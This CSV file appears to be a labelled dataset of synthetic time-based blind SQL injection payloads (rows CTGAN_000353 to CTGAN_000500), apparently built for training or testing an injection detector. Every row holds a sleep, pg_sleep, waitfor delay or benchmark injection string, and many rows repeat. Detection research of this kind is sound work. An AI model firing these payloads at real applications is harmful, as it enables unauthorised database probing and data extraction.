id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000353,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""fdvc"" like ""fdvc",nearest_attack_euclidean,R000738,5.204768295648032
CTGAN_000354,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000530,6.335454355634153
CTGAN_000355,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",nearest_attack_euclidean,R000606,5.514182319949028
CTGAN_000356,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000272,6.152564724245931
CTGAN_000357,attack,time,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',nearest_attack_euclidean,R000506,9.588596232492348
CTGAN_000358,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.933427377051808
CTGAN_000359,attack,time,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000559,9.949784714793301
CTGAN_000360,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,8.269342221534696
CTGAN_000361,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,6.806344642300921
CTGAN_000362,attack,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""lied"" like ""lied",nearest_attack_euclidean,R000746,6.501798060763238
CTGAN_000363,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,7.6258607286773366
CTGAN_000364,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,4.575751884301898
CTGAN_000365,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,7.018075449151727
CTGAN_000366,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,6.2796793280362335
CTGAN_000367,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000214,5.96742691941226
CTGAN_000368,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.463021793456166
CTGAN_000369,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,6.926433468407548
CTGAN_000370,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,8.83719615546893
CTGAN_000371,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",nearest_attack_euclidean,R000769,5.8646959558550185
CTGAN_000372,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000561,5.241065608623656
CTGAN_000373,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,6.189758243740906
CTGAN_000374,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,5.417137945559976
CTGAN_000375,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,5.388460759233285
CTGAN_000376,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,5.924685981052595
CTGAN_000377,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,7.598180639283238
CTGAN_000378,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,6.415356068440087
CTGAN_000379,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.1632760326363085
CTGAN_000380,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000657,5.684483463427163
CTGAN_000381,attack,time,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",nearest_attack_euclidean,R000407,3.6868668640954025
CTGAN_000382,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,5.137213421974832
CTGAN_000383,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000325,5.853549331412454
CTGAN_000384,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000687,4.441526701315032
CTGAN_000385,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,8.168575418271145
CTGAN_000386,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,7.253531692988081
CTGAN_000387,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000364,6.445379954266001
CTGAN_000388,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,4.501039148903764
CTGAN_000389,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,7.066470860645169
CTGAN_000390,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000348,6.994895745795484
CTGAN_000391,attack,time," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",nearest_attack_euclidean,R000653,6.541826885366868
CTGAN_000392,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,6.1857634979641505
CTGAN_000393,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,8.103020937033785
CTGAN_000394,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,5.273248051136053
CTGAN_000395,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.401669077603173
CTGAN_000396,attack,time,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000751,6.910954359141342
CTGAN_000397,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.890383638703211
CTGAN_000398,attack,time,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000559,6.607992515307073
CTGAN_000399,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.71446754714063
CTGAN_000400,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R000677,6.270871217750806
CTGAN_000401,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,5.508211523697997
CTGAN_000402,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,5.404032501101005
CTGAN_000403,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,4.685181380710463
CTGAN_000404,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,6.786728631118616
CTGAN_000405,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.463576107764827
CTGAN_000406,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,6.1642133970038495
CTGAN_000407,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,4.289228786551417
CTGAN_000408,attack,time,"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000694,6.31658785793733
CTGAN_000409,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,5.407486833872606
CTGAN_000410,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000495,6.024348794456673
CTGAN_000411,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,5.599779434931613
CTGAN_000412,attack,time,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000443,7.215886011051639
CTGAN_000413,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,6.062400030258969
CTGAN_000414,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,6.618707436616691
CTGAN_000415,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000644,4.898705509504781
CTGAN_000416,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,4.894748420094638
CTGAN_000417,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.09319763158715
CTGAN_000418,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.809649947612935
CTGAN_000419,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,6.711803873077057
CTGAN_000420,attack,time,"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",nearest_attack_euclidean,R000538,3.6268567716566014
CTGAN_000421,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,6.96116491699701
CTGAN_000422,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,7.62603623714832
CTGAN_000423,attack,time,1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,nearest_attack_euclidean,R000578,7.626413926693702
CTGAN_000424,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000741,6.38149293408923
CTGAN_000425,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000105,5.3097081702125735
CTGAN_000426,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000184,6.457529237186907
CTGAN_000427,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,6.031228471114026
CTGAN_000428,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000562,5.726786587110514
CTGAN_000429,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.524784444238548
CTGAN_000430,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,5.534699048691281
CTGAN_000431,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",nearest_attack_euclidean,R000639,7.931552634511548
CTGAN_000432,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.919829599151398
CTGAN_000433,attack,time,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,nearest_attack_euclidean,R000499,4.026523254538078
CTGAN_000434,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,nearest_attack_euclidean,R000535,5.778316452533767
CTGAN_000435,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000741,6.93630410564953
CTGAN_000436,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,5.934526092150211
CTGAN_000437,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,7.3069672176781
CTGAN_000438,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,5.17310608042753
CTGAN_000439,attack,time,1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,nearest_attack_euclidean,R000578,8.185656772440444
CTGAN_000440,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.006771607462003
CTGAN_000441,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,5.8184097454437325
CTGAN_000442,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,6.737664737584945
CTGAN_000443,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,5.45580995207516
CTGAN_000444,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000516,6.512883116977117
CTGAN_000445,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,6.328002080385486
CTGAN_000446,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.331594246614391
CTGAN_000447,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,6.346328237169445
CTGAN_000448,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,7.2974462869690155
CTGAN_000449,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,5.4201502238836285
CTGAN_000450,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",nearest_attack_euclidean,R000334,6.247576360888802
CTGAN_000451,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,5.121642905313059
CTGAN_000452,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,6.725743828632214
CTGAN_000453,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000728,5.728596761276785
CTGAN_000454,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,5.813133036442883
CTGAN_000455,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,5.9283251831939445
CTGAN_000456,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,7.953043334304681
CTGAN_000457,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,4.079364507445414
CTGAN_000458,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000457,8.365524366652421
CTGAN_000459,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R000438,6.59357736143923
CTGAN_000460,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,6.017192869840777
CTGAN_000461,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,5.950587451578906
CTGAN_000462,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,6.258315880498539
CTGAN_000463,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000279,7.046606065882434
CTGAN_000464,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,7.126276988996348
CTGAN_000465,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000373,7.321371628856264
CTGAN_000466,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,6.264679651122207
CTGAN_000467,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,4.881663005615266
CTGAN_000468,attack,time,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",nearest_attack_euclidean,R000404,6.763815742841918
CTGAN_000469,attack,time,select sleep  (  5   )    )   +',nearest_attack_euclidean,R000463,7.12529626817819
CTGAN_000470,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000530,5.295516282118971
CTGAN_000471,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,5.398402892661933
CTGAN_000472,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,9.337944530351182
CTGAN_000473,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,6.037694724512507
CTGAN_000474,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.025067830678894
CTGAN_000475,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,7.582194614368038
CTGAN_000476,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,6.99924387087973
CTGAN_000477,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",nearest_attack_euclidean,R000717,7.554610955834847
CTGAN_000478,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf",nearest_attack_euclidean,R000280,8.013314999120302
CTGAN_000479,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000558,6.616502768216901
CTGAN_000480,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,7.567443965854429
CTGAN_000481,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000276,6.131105850275781
CTGAN_000482,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,6.447340311589344
CTGAN_000483,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,6.89449613338597
CTGAN_000484,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000633,4.831592222788342
CTGAN_000485,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,5.124992892654929
CTGAN_000486,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,9.285080048300973
CTGAN_000487,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,5.828956301435398
CTGAN_000488,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,6.171764897734934
CTGAN_000489,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,7.93586330249598
CTGAN_000490,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000230,6.523531748066449
CTGAN_000491,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,6.106499650714984
CTGAN_000492,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R000438,6.249174946145098
CTGAN_000493,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.101481493354656
CTGAN_000494,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000612,8.166223175407113
CTGAN_000495,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.811958586495316
CTGAN_000496,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,6.36876585001889
CTGAN_000497,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,nearest_attack_euclidean,R000619,5.379364526788435
CTGAN_000498,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.052654813428062
CTGAN_000499,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,8.256363942545864
CTGAN_000500,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000608,6.5012617511157345
